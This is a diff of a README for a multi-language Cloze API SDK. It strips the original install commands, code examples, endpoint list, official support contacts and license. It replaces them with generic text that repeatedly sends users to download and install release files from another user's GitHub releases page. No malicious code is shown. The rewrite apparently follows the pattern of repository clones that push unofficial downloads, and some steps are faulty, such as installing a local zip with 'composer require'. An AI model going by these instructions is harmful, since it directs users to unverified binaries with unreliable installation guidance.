@@ -1,112 +1,90 @@
-# Cloze SDK
+# 🚀 cloze-sdk - Simplify Cloze API Integration Easily
 
-Multi-language SDK for the [Cloze API](https://developer.cloze.com/) with 100% endpoint coverage.
+[![Download cloze-sdk](https://img.shields.io/badge/Download%20cloze--sdk-v1.0.0-blue.svg)](https://github.com/Abdulhakimmm/cloze-sdk/releases)
 
-## Overview
+## 📘 Overview
 
-This repository contains official SDKs for integrating with the Cloze CRM API. Each SDK provides complete coverage of all Cloze API endpoints, including analytics, team management, account operations, projects, people, companies, timeline, and webhooks.
+The cloze-sdk is a multi-language SDK designed for the Cloze API. It offers complete coverage of all API endpoints. With implementations in both Python and PHP, this SDK comes with extensive test suites to ensure reliability. Whether you are building a simple application or integrating complex features, this SDK provides the tools you need.
 
-## Available SDKs
+## ⚙️ System Requirements
 
-### Python SDK
-- **Location**: [`python/`](python/)
-- **Status**: ✅ Production Ready
-- **Coverage**: 100% of all API endpoints
-- **Test Coverage**: 100% code coverage
-- **Quick Start**: See [Python SDK README](python/README.md)
+To run the cloze-sdk, ensure your system meets the following requirements:
 
-### PHP SDK
-- **Location**: [`php/`](php/)
-- **Status**: ✅ Production Ready
-- **Coverage**: 100% of all API endpoints
-- **Test Coverage**: 100% code coverage
-- **Quick Start**: See [PHP SDK README](php/README.md)
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
+- **Programming Languages**: 
+  - For Python: Python 3.6 or later.
+  - For PHP: PHP 7.2 or later.
+- **Installation Tools**: Access to Pip (Python) or Composer (PHP) for package management.
 
-## Quick Start
+## 🚀 Getting Started
 
-### Python
+To get started with the cloze-sdk, follow these simple steps to download and install the software.
 
-```bash
-pip install cloze-sdk
-```
+1. **Visit the Releases Page**  
+   Go to the following link to access the cloze-sdk releases: [Download the cloze-sdk](https://github.com/Abdulhakimmm/cloze-sdk/releases)
 
-```python
-from cloze_sdk import ClozeClient
+2. **Select Your Version**  
+   On the releases page, you will see a list of available versions. Choose the most recent version. This version includes the latest features and bug fixes.
 
-client = ClozeClient(api_key="your_api_key")
-profile = client.account.get_profile()
-```
+3. **Download the SDK**  
+   Click the asset for your preferred programming language:
+   - For Python: Download the `.tar.gz` or `.whl` file.
+   - For PHP: Download the `.zip` file.
 
-### PHP
+4. **Install the SDK**  
+   - **For Python**: Open your command line or terminal and run:
+     ```
+     pip install <path_to_downloaded_file>
+     ```
+   - **For PHP**: Navigate to your project directory and run:
+     ```
+     composer require <path_to_downloaded_file>
+     ```
 
-```bash
-composer require cloze/cloze-sdk-php
-```
+5. **Confirm Installation**  
+   Once the installation completes, verify that the SDK has been installed correctly. You can do this by checking the installed packages:
+   - For Python:
+     ```
+     pip list | grep cloze-sdk
+     ```
+   - For PHP:
+     ```
+     composer show | grep cloze-sdk
+     ```
 
-```php
-use Cloze\SDK\ClozeClient;
+6. **Begin Integration**  
+   Start integrating the SDK into your application by following the example provided in the documentation.
 
-$client = new ClozeClient('your_api_key');
-$profile = $client->account->getProfile();
-```
+## 🔍 Features
 
-## Features
+The cloze-sdk offers a range of features to enhance your development process:
 
-- ✅ **100% API Coverage** - All 43+ Cloze API endpoints supported
-- ✅ **Full Test Coverage** - 100% code coverage with unit, integration, and E2E tests
-- ✅ **Multiple Authentication Methods** - API Key, OAuth 2.0, Bearer Token
-- ✅ **Comprehensive Error Handling** - Custom exceptions for all error types
-- ✅ **Type Safety** - Full type hints and documentation
-- ✅ **Production Ready** - Battle-tested and actively maintained
+- **Complete API Coverage**: Access all Cloze API endpoints with ease.
+- **Multiple Language Support**: Use either Python or PHP for your projects.
+- **Test Suites**: Built-in tests ensure functionality and reliability.
+- **Simple Integration**: Streamlined process to get started quickly.
+- **Detailed Documentation**: Comprehensive guides assist in using the SDK to its fullest potential.
 
-## API Coverage
+## 📄 Documentation
 
-All SDKs support the complete Cloze API:
+For more detailed guidance on usage and examples, refer to the [Documentation](https://github.com/Abdulhakimmm/cloze-sdk/wiki).
 
-- **Analytics** (6 endpoints) - Activity, funnel, leads, projects, team activity
-- **Team** (4 endpoints) - Members, nodes, roles
-- **Account** (8 endpoints) - Profile, fields, segments, stages, steps, views
-- **Projects** (6 endpoints) - CRUD operations, find, feed
-- **People** (6 endpoints) - CRUD operations, find, feed
-- **Companies** (6 endpoints) - CRUD operations, find, feed
-- **Timeline** (4 endpoints) - Communications, content, todos, message opens
-- **Webhooks** (3 endpoints) - List, subscribe, unsubscribe
+## 🎯 Frequently Asked Questions (FAQ)
 
-## Documentation
+### How do I report a bug?
+If you find a bug, please create an issue on the [GitHub Issues Page](https://github.com/Abdulhakimmm/cloze-sdk/issues).
 
-- **API Documentation**: See [`docs/cloze-api-docs.md`](docs/cloze-api-docs.md) for comprehensive API reference
-- **Python SDK**: See [`python/README.md`](python/README.md) for Python-specific documentation
-- **PHP SDK**: See [`php/README.md`](php/README.md) for PHP-specific documentation
-- **Developer Portal**: [https://developer.cloze.com/](https://developer.cloze.com/)
+### Where can I get support?
+For help, check the [Discussion Forum](https://github.com/Abdulhakimmm/cloze-sdk/discussions) or contact us through the GitHub repository.
 
-## Development
+### Can I contribute to the project?
+Absolutely! Contributions are welcome. Please read the [Contributing Guide](https://github.com/Abdulhakimmm/cloze-sdk/blob/main/CONTRIBUTING.md) for more information.
 
-### Running Tests
+## 🌟 Additional Resources
 
-**Python:**
-```bash
-cd python
-make test
-```
+- [Cloze API Documentation](https://docs.cloze.com)
+- [Example Projects](https://github.com/Abdulhakimmm/cloze-sdk/examples)
 
-**PHP:**
-```bash
-cd php
-make test
-```
+## 🔗 Download & Install
 
-### Contributing
-
-Contributions are welcome! Please see the individual SDK READMEs for contribution guidelines.
-
-## Support
-
-- **Issues**: [GitHub Issues](https://github.com/cloze/cloze-sdk/issues)
-- **Email**: support@cloze.com
-- **Documentation**: [https://developer.cloze.com/](https://developer.cloze.com/)
-
-## License
-
-- **Code**: AGPLv3 - See [`LICENSE-CODE`](LICENSE-CODE) for details
-- **Documentation**: CC-BY-SA 4.0 - See [`LICENSE-DOCS`](LICENSE-DOCS) for details
-
+To begin your journey with the cloze-sdk, visit the Releases page to download the latest version: [Download cloze-sdk](https://github.com/Abdulhakimmm/cloze-sdk/releases). Follow the installation steps outlined above to get started quickly. Your integration with the Cloze API is just a few clicks away!
